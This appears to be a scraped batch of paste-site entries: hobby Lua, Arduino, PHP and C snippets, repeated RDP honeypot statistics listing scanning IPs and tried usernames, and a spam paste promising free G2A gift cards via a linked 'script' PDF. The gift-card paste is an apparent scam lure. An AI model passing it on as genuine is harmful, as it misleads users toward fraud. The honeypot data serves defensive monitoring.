    repeat
        convertTime(time)
        time = time - 1
        os.sleep(1)
    until time == -1 

    monitor.clear()

    if speaker then
        -- Play a sound (replace ""sound_name"" with the name of the sound file)
        speaker.playSound(""UwU"")
    else
        print(""Speaker not avalable right now"")
    end
    WaitingForInput = true
end

function executeCommand(command)
    local action, value = string.match(command, ""(%a+)%s+(%d+)"")
    if action == ""Time"" then
        local number = tonumber(value)
        if number then
            StartTimer(number)
            return ""Running Command: Time""
        else
            return ""Invalid format.""
        end
    else
        return ""Unknown command.""
    end
end

while WaitingForInput do
    local senderId, message, protocol = rednet.receive()
    monitor.setCursorPos(1,3)
    local Text = ""Received message from ID"" .. senderId .. "": "" .. message
    print(Text)
    monitor.write(Text)
    os.sleep(1.5)
    Text = ""Message Type: Command""
    monitor.setCursorPos(1,4)
    print(Text)
    monitor.write(Text)
    os.sleep(2)
    monitor.setCursorPos(1,5)
    Text = executeCommand(message)
    print(Text)
    monitor.write(Text)
    os.sleep(0.5)
    if message == ""Invalid format."" or ""Unknown command."" then
        monitor.setCursorPos(1, 1)
        monitor.clear()

        monitor.write(os.getComputerID())
        print(os.getComputerID())

        monitor.setCursorPos(1,2)
        print(""Waiting For Command..."")
        monitor.write(""Waiting For Command..."")
    else
        WaitingForInput = false
    end
end"
a6QPR8ph,server.json,xeteor,JSON,Sunday 2nd of June 2024 09:32:16 PM CDT,"{
  ""server"": {
    ""active"": 1
  }
}"
JZV5fyHB,🤑 G2A.com Free Gift Card Guide Jun 2024 FIX 🎁,ssss50w,GetText,Sunday 2nd of June 2024 08:38:53 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view

Working as of:
03 June 2024"
32kdhyMP,Login,Handoyo22,HTML,Sunday 2nd of June 2024 08:15:30 PM CDT,"<div class=""banner"">
        <div class=""container"">
            <div class=""row Section"">
                <div class=""col-md-6 offset-md-3"">
                    <div class=""card shadow-lg mt-5"">
                        <div class=""card-body"">
                            <div class=""login-content text-center"">
                                <form class=""user"" method=""POST"" action=""<?php echo base_url('login') ?>"">
                                    <h2 class=""title mb-4""><font size=""5"">Login SGHC </font></h2>
                                    <?php echo $this->session->flashdata('pesan')?>
                                    <div class=""form-group input-div one"">
                                        <div class=""input-group"">
                                            <div class=""input-group-prepend"">
                                                <span class=""input-group-text""><i class=""fas fa-user""></i></span>
                                            </div>
                                            <input type=""text"" class=""form-control"" name=""username"" placeholder=""Username"">
                                        </div>
                                        <?php echo form_error('username', '<div class=""text-small text-danger""> </div>')?>
                                    </div>
                                    <div class=""form-group input-div pass"">
                                        <div class=""input-group"">
                                            <div class=""input-group-prepend"">
                                                <span class=""input-group-text""><i class=""fas fa-lock""></i></span>
                                            </div>
                                            <input type=""password"" class=""form-control"" name=""password"" placeholder=""Password"">
                                        </div>
                                        <?php echo form_error('password', '<div class=""text-small text-danger""> </div>')?>
                                    </div>
                                    <input type=""submit"" class=""btn btn-primary btn-block"" value=""Login"">
                                </form>
                            </div>
                        </div>
                    </div>
                    <div class=""text-center mt-3"">
                        <p>Healthy Challenges merupakan bentuk komitmen menjaga kesehatan pekerja, yang merupakan salah satu aset terpenting bagi perusahaan.</p>
                    </div>
                </div>
            </div>
        </div>
</div>
<script type=""text/javascript"" src=""<?php echo base_url(); ?>assets/js/main.js""></script>

<style>

.card {
    border-radius: 10px;
}

.input-group-text {
    background-color: #007bff;
    color: #fff;
}

.btn-primary {
    background-color: #007bff;
    border: none;
}

.btn-primary:hover {
    background-color: #0056b3;
}

.title {
    font-size: 1.5rem; /* Adjust font size for mobile */
}

.form-group {
    margin-bottom: 1.5rem; /* Increase space between form groups for better readability */
}

.text-small {
    font-size: 0.875rem; /* Adjust error message size for mobile */
}

@media (max-width: 450px) {
    .card {
        margin: 20px; /* Add margin for better spacing on small screens */
    }

    .title {
        font-size: 1.25rem; /* Further adjust font size for very small screens */
    }
}
</style>

"
CE7WhJKZ,"""Bluetooth Control"" rev_01",pleasedontcode,Arduino,Sunday 2nd of June 2024 08:07:46 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: ""Bluetooth Control""
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2024-06-03 01:07:15

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Create a retro console on Arduino using */
	/* SoftwareSerial for dual Bluetooth HC-05 modules. */
	/* The system initializes serial communication at */
	/* 9600 baud for both modules, enabling wireless data */
	/* transfer. */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <SoftwareSerial.h>

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
void updateOutputs(void);

/***** DEFINITION OF DIGITAL OUTPUT PINS *****/
const uint8_t myLED_RGB_LEDRGB_Red_PIN_D2 = 2;
const uint8_t myLED_RGB_LEDRGB_Green_PIN_D3 = 3;
const uint8_t myLED_RGB_LEDRGB_Blue_PIN_D4 = 4;

/***** DEFINITION OF Software Serial *****/
const uint8_t bluetooth_HC05_mySerial1_PIN_SERIAL_TX_A0 = A0;
const uint8_t bluetooth_HC05_mySerial1_PIN_SERIAL_RX_A1 = A1;
const uint8_t bluetooth_HC05_mySerial2_PIN_SERIAL_TX_A2 = A2;
const uint8_t bluetooth_HC05_mySerial2_PIN_SERIAL_RX_A3 = A3;

// Instantiate SoftwareSerial objects for both Bluetooth modules
SoftwareSerial bluetooth_HC05_mySerial1(bluetooth_HC05_mySerial1_PIN_SERIAL_RX_A1, bluetooth_HC05_mySerial1_PIN_SERIAL_TX_A0);
SoftwareSerial bluetooth_HC05_mySerial2(bluetooth_HC05_mySerial2_PIN_SERIAL_RX_A3, bluetooth_HC05_mySerial2_PIN_SERIAL_TX_A2);

/***** DEFINITION OF OUTPUT RAW VARIABLES *****/
/***** used to store raw data *****/
bool myLED_RGB_LEDRGB_Red_PIN_D2_rawData = 0;
bool myLED_RGB_LEDRGB_Green_PIN_D3_rawData = 0;
bool myLED_RGB_LEDRGB_Blue_PIN_D4_rawData = 0;

/***** DEFINITION OF OUTPUT PHYSICAL VARIABLES *****/
/***** used to store data after characteristic curve transformation *****/
float myLED_RGB_LEDRGB_Red_PIN_D2_phyData = 0.0;
float myLED_RGB_LEDRGB_Green_PIN_D3_phyData = 0.0;
float myLED_RGB_LEDRGB_Blue_PIN_D4_phyData = 0.0;

void setup(void)
{
    // put your setup code here, to run once:

    pinMode(myLED_RGB_LEDRGB_Red_PIN_D2, OUTPUT);
    pinMode(myLED_RGB_LEDRGB_Green_PIN_D3, OUTPUT);
    pinMode(myLED_RGB_LEDRGB_Blue_PIN_D4, OUTPUT);

    // Initialize both Bluetooth modules at 9600 baud
    bluetooth_HC05_mySerial1.begin(9600);
    bluetooth_HC05_mySerial2.begin(9600);
}

void loop(void)
{
    // put your main code here, to run repeatedly:

    updateOutputs(); // Refresh output data

    // Example of reading from one Bluetooth module and writing to another
    if (bluetooth_HC05_mySerial1.available())
    {
        char data = bluetooth_HC05_mySerial1.read();
        bluetooth_HC05_mySerial2.write(data);
    }

    if (bluetooth_HC05_mySerial2.available())
    {
        char data = bluetooth_HC05_mySerial2.read();
        bluetooth_HC05_mySerial1.write(data);
    }
}

void updateOutputs()
{
    digitalWrite(myLED_RGB_LEDRGB_Red_PIN_D2, myLED_RGB_LEDRGB_Red_PIN_D2_rawData);
    digitalWrite(myLED_RGB_LEDRGB_Green_PIN_D3, myLED_RGB_LEDRGB_Green_PIN_D3_rawData);
    digitalWrite(myLED_RGB_LEDRGB_Blue_PIN_D4, myLED_RGB_LEDRGB_Blue_PIN_D4_rawData);
}

/* END CODE */"
BMm9E2Ap,d,portalxwe,GetText,Sunday 2nd of June 2024 07:53:08 PM CDT,"d
























d"
DnW31daq,2024-06-02_stats.json,rdp_snitch,JSON,Sunday 2nd of June 2024 07:18:12 PM CDT,"{
  ""ip"": {
    ""140.246.175.203"": 3,
    ""116.140.196.215"": 6,
    ""199.45.154.25"": 3,
    ""58.218.199.219"": 9,
    ""94.232.46.148"": 9,
    ""45.137.201.185"": 3,
    ""205.210.31.212"": 9,
    ""80.66.76.121"": 3,
    ""167.94.145.98"": 3,
    ""164.92.104.215"": 12,
    ""212.70.149.142"": 12,
    ""87.251.75.120"": 6,
    ""64.124.50.139"": 6,
    ""117.16.46.253"": 6,
    ""91.238.181.71"": 6,
    ""185.170.144.3"": 6,
    ""194.165.16.10"": 6,
    ""198.135.49.131"": 51,
    ""187.157.89.218"": 3,
    ""77.91.219.34"": 6,
    ""185.196.220.41"": 9,
    ""154.91.82.169"": 13149,
    ""116.182.20.8"": 3,
    ""194.165.16.11"": 6,
    ""198.235.24.116"": 9,
    ""152.42.242.235"": 3,
    ""60.255.174.158"": 3,
    ""183.82.117.93"": 3,
    ""167.179.37.82"": 3,
    ""43.129.251.187"": 1815,
    ""125.67.192.49"": 3,
    ""165.154.182.219"": 3,
    ""198.235.24.5"": 9,
    ""111.180.202.79"": 3,
    ""185.180.143.140"": 3,
    ""194.165.16.37"": 6,
    ""45.227.254.8"": 6,
    ""102.129.235.111"": 3,
    ""128.14.188.98"": 18,
    ""205.210.31.208"": 9
  },
  ""asn"": {
    ""AS58519"": 3,
    ""AS4837"": 9,
    ""AS398722"": 3,
    ""AS4134"": 12,
    ""AS212482"": 9,
    ""AS49581"": 3,
    ""AS396982"": 36,
    ""AS208091"": 9,
    ""AS398705"": 3,
    ""AS14061"": 15,
    ""AS204428"": 12,
    ""AS6461"": 6,
    ""AS18031"": 6,
    ""AS49434"": 6,
    ""AS197414"": 6,
    ""AS48721"": 18,
    ""AS396073"": 51,
    ""AS8151"": 3,
    ""AS43012"": 6,
    ""AS208046"": 9,
    ""AS399077"": 13149,
    ""AS137539"": 3,
    ""AS18209"": 3,
    ""AS9902"": 3,
    ""AS132203"": 1815,
    ""AS135377"": 3,
    ""AS148981"": 3,
    ""AS211680"": 3,
    ""AS267784"": 6,
    ""AS174"": 3,
    ""AS21859"": 18
  },
  ""isp"": {
    ""Cloud Computing Corporation"": 3,
    ""China Unicom CHINA169 Network"": 9,
    ""Censys, Inc."": 6,
    ""Chinanet"": 12,
    ""Xhost Internet Solutions LP"": 24,
    ""Ferdinand Zink trading as Tube-Hosting"": 3,
    ""Google LLC"": 36,
    ""DigitalOcean, LLC"": 15,
    ""SS-Net"": 12,
    ""Zayo Bandwidth"": 6,
    ""Sangmyung University"": 6,
    ""Datacenter location PAR1 France"": 6,
    ""Flyservers S.A."": 24,
    ""Majestic Hosting Solutions, LLC"": 51,
    ""Uninet S.A. de C.V."": 3,
    ""Gastabudstaden AB"": 6,
    ""ColocationX Ltd."": 9,
    ""Tcloudnet Inc"": 13149,
    ""China Unicom China169 Network"": 3,
    ""Beam Telecom Pvt Ltd"": 3,
    ""NeocomISP Limited"": 3,
    ""Aceville Pte.ltd"": 1815,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""China Telecom"": 3,
    ""NSEC - Sistemas Informaticos, S.A."": 3,
    ""FTS120 EX Cogent"": 3,
    ""Zenlayer Inc"": 18
  },
  ""org"": {
    ""Chinanet SD"": 3,
    ""China United Network Communications Corporation Limited"": 6,
    ""Censys, Inc."": 6,
    ""Chinanet JS"": 9,
    ""Dmitriy Panchenko"": 9,
    ""Taurus"": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""Xhost Internet Solutions"": 9,
    ""DigitalOcean, LLC"": 15,
    ""Global Communication Net Plc"": 12,
    ""Microsoft Corporation"": 6,
    ""Korean Education Network"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Xhostis"": 6,
    ""Flyservers S.A"": 18,
    ""Majestic Hosting Solutions, LLC"": 51,
    ""Uninet S.A. de C.V."": 3,
    ""Gastabud"": 6,
    ""Makut Investments"": 9,
    ""Tcloudnet Inc"": 13149,
    ""Unknown"": 1818,
    ""SiChuan Cable TV Network CO., LTD"": 3,
    ""Beam Telecom Pvt Ltd"": 3,
    ""NeocomISP Limited"": 3,
    ""Chinanet SC"": 3,
    ""Ucloud Information Technology"": 3,
    ""Chinanet HB"": 3,
    ""ICG 1 Inap"": 3,
    ""UAB Host Baltic"": 6,
    ""Digital Energy Technologies Limited"": 3,
    ""ZENLA"": 18
  },
  ""regionName"": {
    ""Shandong"": 3,
    ""Beijing"": 9,
    ""New York"": 3,
    ""Jiangsu"": 9,
    ""Perm Krai"": 9,
    ""Lombardy"": 3,
    ""California"": 69,
    ""North Holland"": 15,
    ""Michigan"": 3,
    ""Sofia-Capital"": 12,
    ""Washington"": 6,
    ""Seoul"": 6,
    ""\u00cele-de-France"": 6,
    ""Kaunas"": 18,
    ""Texas"": 51,
    ""Mexico City"": 3,
    ""S\u00f6dermanland County"": 6,
    ""Virginia"": 9,
    ""North West"": 13149,
    ""South West"": 3,
    ""Sichuan"": 6,
    ""Telangana"": 3,
    ""Phnom Penh"": 3,
    ""Central and Western District"": 1815,
    ""Hubei"": 3,
    ""Illinois"": 3,
    ""Vilnius"": 6,
    ""District of Columbia"": 3
  },
  ""country"": {
    ""China"": 30,
    ""United States"": 147,
    ""Russia"": 9,
    ""Italy"": 3,
    ""The Netherlands"": 15,
    ""Bulgaria"": 12,
    ""South Korea"": 6,
    ""France"": 6,
    ""Lithuania"": 24,
    ""Mexico"": 3,
    ""Sweden"": 6,
    ""Singapore"": 13152,
    ""India"": 3,
    ""Cambodia"": 3,
    ""Hong Kong"": 1815
  },
  ""account"": {
    ""142.93.8.59"": 3,
    ""(empty)"": 30,
    ""hello"": 1896,
    ""Domain"": 18,
    ""ePlqsSYEX"": 3,
    ""UrVZvi"": 3,
    ""GqBFvY"": 3,
    ""Administr"": 27,
    ""Test"": 48,
    ""927833797"": 13149,
    ""oBNwaWjid"": 3,
    ""NIpEoY"": 3,
    ""CwrDCn"": 3,
    ""Administrator"": 3,
    ""mGuikhJED"": 3,
    ""rMwSfO"": 3,
    ""sQBhQC"": 3,
    ""nz5ksafa"": 3,
    ""iHMAD"": 3,
    ""root"": 18,
    ""qhfYSDhRQ"": 3,
    ""cGNHgU"": 3,
    ""FHFbJJ"": 3
  },
  ""keyboard"": {
    ""Unknown"": 15234
  },
  ""client_build"": {
    ""Unknown"": 15234
  },
  ""client_name"": {
    ""Unknown"": 15234
  },
  ""ip_type"": {
    ""hosting"": 1944,
    ""Unknown"": 13275,
    ""proxy"": 12,
    ""hosting & proxy"": 3
  }
}"
LavNxfWS,2024-06-02_stats.json,rdp_snitch,JSON,Sunday 2nd of June 2024 07:16:19 PM CDT,"{
  ""ip"": {
    ""140.246.175.203"": 2,
    ""116.140.196.215"": 4,
    ""199.45.154.25"": 2,
    ""58.218.199.219"": 6,
    ""94.232.46.148"": 6,
    ""45.137.201.185"": 2,
    ""205.210.31.212"": 6,
    ""80.66.76.121"": 2,
    ""167.94.145.98"": 2,
    ""164.92.104.215"": 8,
    ""212.70.149.142"": 8,
    ""87.251.75.120"": 4,
    ""64.124.50.139"": 4,
    ""117.16.46.253"": 4,
    ""91.238.181.71"": 4,
    ""185.170.144.3"": 4,
    ""194.165.16.10"": 4,
    ""198.135.49.131"": 34,
    ""187.157.89.218"": 2,
    ""77.91.219.34"": 4,
    ""185.196.220.41"": 6,
    ""154.91.82.169"": 8766,
    ""116.182.20.8"": 2,
    ""194.165.16.11"": 4,
    ""198.235.24.116"": 6,
    ""152.42.242.235"": 2,
    ""60.255.174.158"": 2,
    ""183.82.117.93"": 2,
    ""167.179.37.82"": 2,
    ""43.129.251.187"": 1210,
    ""125.67.192.49"": 2,
    ""165.154.182.219"": 2,
    ""198.235.24.5"": 6,
    ""111.180.202.79"": 2,
    ""185.180.143.140"": 2,
    ""194.165.16.37"": 4,
    ""45.227.254.8"": 4,
    ""102.129.235.111"": 2,
    ""128.14.188.98"": 12,
    ""205.210.31.208"": 6
  },
  ""asn"": {
    ""AS58519"": 2,
    ""AS4837"": 6,
    ""AS398722"": 2,
    ""AS4134"": 8,
    ""AS212482"": 6,
    ""AS49581"": 2,
    ""AS396982"": 24,
    ""AS208091"": 6,
    ""AS398705"": 2,
    ""AS14061"": 10,
    ""AS204428"": 8,
    ""AS6461"": 4,
    ""AS18031"": 4,
    ""AS49434"": 4,
    ""AS197414"": 4,
    ""AS48721"": 12,
    ""AS396073"": 34,
    ""AS8151"": 2,
    ""AS43012"": 4,
    ""AS208046"": 6,
    ""AS399077"": 8766,
    ""AS137539"": 2,
    ""AS18209"": 2,
    ""AS9902"": 2,
    ""AS132203"": 1210,
    ""AS135377"": 2,
    ""AS148981"": 2,
    ""AS211680"": 2,
    ""AS267784"": 4,
    ""AS174"": 2,
    ""AS21859"": 12
  },
  ""isp"": {
    ""Cloud Computing Corporation"": 2,
    ""China Unicom CHINA169 Network"": 6,
    ""Censys, Inc."": 4,
    ""Chinanet"": 8,
    ""Xhost Internet Solutions LP"": 16,
    ""Ferdinand Zink trading as Tube-Hosting"": 2,
    ""Google LLC"": 24,
    ""DigitalOcean, LLC"": 10,
    ""SS-Net"": 8,
    ""Zayo Bandwidth"": 4,
    ""Sangmyung University"": 4,
    ""Datacenter location PAR1 France"": 4,
    ""Flyservers S.A."": 16,
    ""Majestic Hosting Solutions, LLC"": 34,
    ""Uninet S.A. de C.V."": 2,
    ""Gastabudstaden AB"": 4,
    ""ColocationX Ltd."": 6,
    ""Tcloudnet Inc"": 8766,
    ""China Unicom China169 Network"": 2,
    ""Beam Telecom Pvt Ltd"": 2,
    ""NeocomISP Limited"": 2,
    ""Aceville Pte.ltd"": 1210,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""China Telecom"": 2,
    ""NSEC - Sistemas Informaticos, S.A."": 2,
    ""FTS120 EX Cogent"": 2,
    ""Zenlayer Inc"": 12
  },
  ""org"": {
    ""Chinanet SD"": 2,
    ""China United Network Communications Corporation Limited"": 4,
    ""Censys, Inc."": 4,
    ""Chinanet JS"": 6,
    ""Dmitriy Panchenko"": 6,
    ""Taurus"": 2,
    ""Palo Alto Networks, Inc"": 24,
    ""Xhost Internet Solutions"": 6,
    ""DigitalOcean, LLC"": 10,
    ""Global Communication Net Plc"": 8,
    ""Microsoft Corporation"": 4,
    ""Korean Education Network"": 4,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""Xhostis"": 4,
    ""Flyservers S.A"": 12,
    ""Majestic Hosting Solutions, LLC"": 34,
    ""Uninet S.A. de C.V."": 2,
    ""Gastabud"": 4,
    ""Makut Investments"": 6,
    ""Tcloudnet Inc"": 8766,
    ""Unknown"": 1212,
    ""SiChuan Cable TV Network CO., LTD"": 2,
    ""Beam Telecom Pvt Ltd"": 2,
    ""NeocomISP Limited"": 2,
    ""Chinanet SC"": 2,
    ""Ucloud Information Technology"": 2,
    ""Chinanet HB"": 2,
    ""ICG 1 Inap"": 2,
    ""UAB Host Baltic"": 4,
    ""Digital Energy Technologies Limited"": 2,
    ""ZENLA"": 12
  },
  ""regionName"": {
    ""Shandong"": 2,
    ""Beijing"": 6,
    ""New York"": 2,
    ""Jiangsu"": 6,
    ""Perm Krai"": 6,
    ""Lombardy"": 2,
    ""California"": 46,
    ""North Holland"": 10,
    ""Michigan"": 2,
    ""Sofia-Capital"": 8,
    ""Washington"": 4,
    ""Seoul"": 4,
    ""\u00cele-de-France"": 4,
    ""Kaunas"": 12,
    ""Texas"": 34,
    ""Mexico City"": 2,
    ""S\u00f6dermanland County"": 4,
    ""Virginia"": 6,
    ""North West"": 8766,
    ""South West"": 2,
    ""Sichuan"": 4,
    ""Telangana"": 2,
    ""Phnom Penh"": 2,
    ""Central and Western District"": 1210,
    ""Hubei"": 2,
    ""Illinois"": 2,
    ""Vilnius"": 4,
    ""District of Columbia"": 2
  },
  ""country"": {
    ""China"": 20,
    ""United States"": 98,
    ""Russia"": 6,
    ""Italy"": 2,
    ""The Netherlands"": 10,
    ""Bulgaria"": 8,
    ""South Korea"": 4,
    ""France"": 4,
    ""Lithuania"": 16,
    ""Mexico"": 2,
    ""Sweden"": 4,
    ""Singapore"": 8768,
    ""India"": 2,
    ""Cambodia"": 2,
    ""Hong Kong"": 1210
  },
  ""account"": {
    ""142.93.8.59"": 2,
    ""(empty)"": 20,
    ""hello"": 1264,
    ""Domain"": 12,
    ""ePlqsSYEX"": 2,
    ""UrVZvi"": 2,
    ""GqBFvY"": 2,
    ""Administr"": 18,
    ""Test"": 32,
    ""927833797"": 8766,
    ""oBNwaWjid"": 2,
    ""NIpEoY"": 2,
    ""CwrDCn"": 2,
    ""Administrator"": 2,
    ""mGuikhJED"": 2,
    ""rMwSfO"": 2,
    ""sQBhQC"": 2,
    ""nz5ksafa"": 2,
    ""iHMAD"": 2,
    ""root"": 12,
    ""qhfYSDhRQ"": 2,
    ""cGNHgU"": 2,
    ""FHFbJJ"": 2
  },
  ""keyboard"": {
    ""Unknown"": 10156
  },
  ""client_build"": {
    ""Unknown"": 10156
  },
  ""client_name"": {
    ""Unknown"": 10156
  },
  ""ip_type"": {
    ""hosting"": 1296,
    ""Unknown"": 8850,
    ""proxy"": 8,
    ""hosting & proxy"": 2
  }
}"
cQiHApSq,2024-06-02_stats.json,rdp_snitch,JSON,Sunday 2nd of June 2024 07:15:09 PM CDT,"{
  ""ip"": {
    ""140.246.175.203"": 1,
    ""116.140.196.215"": 2,
    ""199.45.154.25"": 1,
    ""58.218.199.219"": 3,
    ""94.232.46.148"": 3,
    ""45.137.201.185"": 1,
    ""205.210.31.212"": 3,
    ""80.66.76.121"": 1,
    ""167.94.145.98"": 1,
    ""164.92.104.215"": 4,
    ""212.70.149.142"": 4,
    ""87.251.75.120"": 2,
    ""64.124.50.139"": 2,
    ""117.16.46.253"": 2,
    ""91.238.181.71"": 2,
    ""185.170.144.3"": 2,
    ""194.165.16.10"": 2,
    ""198.135.49.131"": 17,
    ""187.157.89.218"": 1,
    ""77.91.219.34"": 2,
    ""185.196.220.41"": 3,
    ""154.91.82.169"": 4383,
    ""116.182.20.8"": 1,
    ""194.165.16.11"": 2,
    ""198.235.24.116"": 3,
    ""152.42.242.235"": 1,
    ""60.255.174.158"": 1,
    ""183.82.117.93"": 1,
    ""167.179.37.82"": 1,
    ""43.129.251.187"": 605,
    ""125.67.192.49"": 1,
    ""165.154.182.219"": 1,
    ""198.235.24.5"": 3,
    ""111.180.202.79"": 1,
    ""185.180.143.140"": 1,
    ""194.165.16.37"": 2,
    ""45.227.254.8"": 2,
    ""102.129.235.111"": 1,
    ""128.14.188.98"": 6,
    ""205.210.31.208"": 3
  },
  ""asn"": {
    ""AS58519"": 1,
    ""AS4837"": 3,
    ""AS398722"": 1,
    ""AS4134"": 4,
    ""AS212482"": 3,
    ""AS49581"": 1,
    ""AS396982"": 12,
    ""AS208091"": 3,
    ""AS398705"": 1,
    ""AS14061"": 5,
    ""AS204428"": 4,
    ""AS6461"": 2,
    ""AS18031"": 2,
    ""AS49434"": 2,
    ""AS197414"": 2,
    ""AS48721"": 6,
    ""AS396073"": 17,
    ""AS8151"": 1,
    ""AS43012"": 2,
    ""AS208046"": 3,
    ""AS399077"": 4383,
    ""AS137539"": 1,
    ""AS18209"": 1,
    ""AS9902"": 1,
    ""AS132203"": 605,
    ""AS135377"": 1,
    ""AS148981"": 1,
    ""AS211680"": 1,
    ""AS267784"": 2,
    ""AS174"": 1,
    ""AS21859"": 6
  },
  ""isp"": {
    ""Cloud Computing Corporation"": 1,
    ""China Unicom CHINA169 Network"": 3,
    ""Censys, Inc."": 2,
    ""Chinanet"": 4,
    ""Xhost Internet Solutions LP"": 8,
    ""Ferdinand Zink trading as Tube-Hosting"": 1,
    ""Google LLC"": 12,
    ""DigitalOcean, LLC"": 5,
    ""SS-Net"": 4,
    ""Zayo Bandwidth"": 2,
    ""Sangmyung University"": 2,
    ""Datacenter location PAR1 France"": 2,
    ""Flyservers S.A."": 8,
    ""Majestic Hosting Solutions, LLC"": 17,
    ""Uninet S.A. de C.V."": 1,
    ""Gastabudstaden AB"": 2,
    ""ColocationX Ltd."": 3,
    ""Tcloudnet Inc"": 4383,
    ""China Unicom China169 Network"": 1,
    ""Beam Telecom Pvt Ltd"": 1,
    ""NeocomISP Limited"": 1,
    ""Aceville Pte.ltd"": 605,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""China Telecom"": 1,
    ""NSEC - Sistemas Informaticos, S.A."": 1,
    ""FTS120 EX Cogent"": 1,
    ""Zenlayer Inc"": 6
  },
  ""org"": {
    ""Chinanet SD"": 1,
    ""China United Network Communications Corporation Limited"": 2,
    ""Censys, Inc."": 2,
    ""Chinanet JS"": 3,
    ""Dmitriy Panchenko"": 3,
    ""Taurus"": 1,
    ""Palo Alto Networks, Inc"": 12,
    ""Xhost Internet Solutions"": 3,
    ""DigitalOcean, LLC"": 5,
    ""Global Communication Net Plc"": 4,
    ""Microsoft Corporation"": 2,
    ""Korean Education Network"": 2,
    ""ThinkTech Technology Industrial CO. Limited"": 2,
    ""Xhostis"": 2,
    ""Flyservers S.A"": 6,
    ""Majestic Hosting Solutions, LLC"": 17,
    ""Uninet S.A. de C.V."": 1,
    ""Gastabud"": 2,
    ""Makut Investments"": 3,
    ""Tcloudnet Inc"": 4383,
    ""Unknown"": 606,
    ""SiChuan Cable TV Network CO., LTD"": 1,
    ""Beam Telecom Pvt Ltd"": 1,
    ""NeocomISP Limited"": 1,
    ""Chinanet SC"": 1,
    ""Ucloud Information Technology"": 1,
    ""Chinanet HB"": 1,
    ""ICG 1 Inap"": 1,
    ""UAB Host Baltic"": 2,
    ""Digital Energy Technologies Limited"": 1,
    ""ZENLA"": 6
  },
  ""regionName"": {
    ""Shandong"": 1,
    ""Beijing"": 3,
    ""New York"": 1,
    ""Jiangsu"": 3,
    ""Perm Krai"": 3,
    ""Lombardy"": 1,
    ""California"": 23,
    ""North Holland"": 5,
    ""Michigan"": 1,
    ""Sofia-Capital"": 4,
    ""Washington"": 2,
    ""Seoul"": 2,
    ""\u00cele-de-France"": 2,
    ""Kaunas"": 6,
    ""Texas"": 17,
    ""Mexico City"": 1,
    ""S\u00f6dermanland County"": 2,
    ""Virginia"": 3,
    ""North West"": 4383,
    ""South West"": 1,
    ""Sichuan"": 2,
    ""Telangana"": 1,
    ""Phnom Penh"": 1,
    ""Central and Western District"": 605,
    ""Hubei"": 1,
    ""Illinois"": 1,
    ""Vilnius"": 2,
    ""District of Columbia"": 1
  },
  ""country"": {
    ""China"": 10,
    ""United States"": 49,
    ""Russia"": 3,
    ""Italy"": 1,
    ""The Netherlands"": 5,
    ""Bulgaria"": 4,
    ""South Korea"": 2,
    ""France"": 2,
    ""Lithuania"": 8,
    ""Mexico"": 1,
    ""Sweden"": 2,
    ""Singapore"": 4384,
    ""India"": 1,
    ""Cambodia"": 1,
    ""Hong Kong"": 605
  },
  ""account"": {
    ""142.93.8.59"": 1,
    ""(empty)"": 10,
    ""hello"": 632,
    ""Domain"": 6,
    ""ePlqsSYEX"": 1,
    ""UrVZvi"": 1,
    ""GqBFvY"": 1,
    ""Administr"": 9,
    ""Test"": 16,
    ""927833797"": 4383,
    ""oBNwaWjid"": 1,
    ""NIpEoY"": 1,
    ""CwrDCn"": 1,
    ""Administrator"": 1,
    ""mGuikhJED"": 1,
    ""rMwSfO"": 1,
    ""sQBhQC"": 1,
    ""nz5ksafa"": 1,
    ""iHMAD"": 1,
    ""root"": 6,
    ""qhfYSDhRQ"": 1,
    ""cGNHgU"": 1,
    ""FHFbJJ"": 1
  },
  ""keyboard"": {
    ""Unknown"": 5078
  },
  ""client_build"": {
    ""Unknown"": 5078
  },
  ""client_name"": {
    ""Unknown"": 5078
  },
  ""ip_type"": {
    ""hosting"": 648,
    ""Unknown"": 4425,
    ""proxy"": 4,
    ""hosting & proxy"": 1
  }
}"
J97w82dK,Pastebin.ai - #1 Pastebin Alternative,xxsa,PHP,Sunday 2nd of June 2024 06:52:28 PM CDT,"https://pastebin.ai - #1 Pastebin Alternative

its free and always will be.

pastebin.ai  is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Support Markdown & 150+ different syntax languages - All Free
Link redirect 
Simple Ads by Google Adsense Few rather than Pastebin
Paste Folders
Load files feature
Password protected pastes.
Encrypted pastes.
URL Shortener.
Unlisted pastes.
Private pastes.
Embed, download, print pastes.
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Encrypted pastes.
Trending pastes page (day, week, month, year).
No Captcha for logged in users feature.
.....
......................................
........."
pnPLvkha,2024_fun_with_strings,gpsgiraldi,C,Sunday 2nd of June 2024 06:37:33 PM CDT,"#include <stdio.h>
#include <string.h>

int main()
{
    int i,j,n;
    char str0[100],str1[40];
    
//    printf(""Set size of string vector: \n"");
//    scanf(""%d"",&n);
    for(j=0;j<40;j++){
        str1[j]='%';
    }
    printf(""Let's play with something here...\n"");
    printf(""... type something so we can start it: \n"");
    setbuf(stdin,NULL);

    fgets(str0,99,stdin);
    printf(""\n... it encompasses %ld positions in the vector, that means, including 'ENTER' function"",strlen(str0));
    printf(""\n\nYou have typed:\n"");
    fputs(str0,stdout);
    for(i=0;i<strlen(str0);i++){
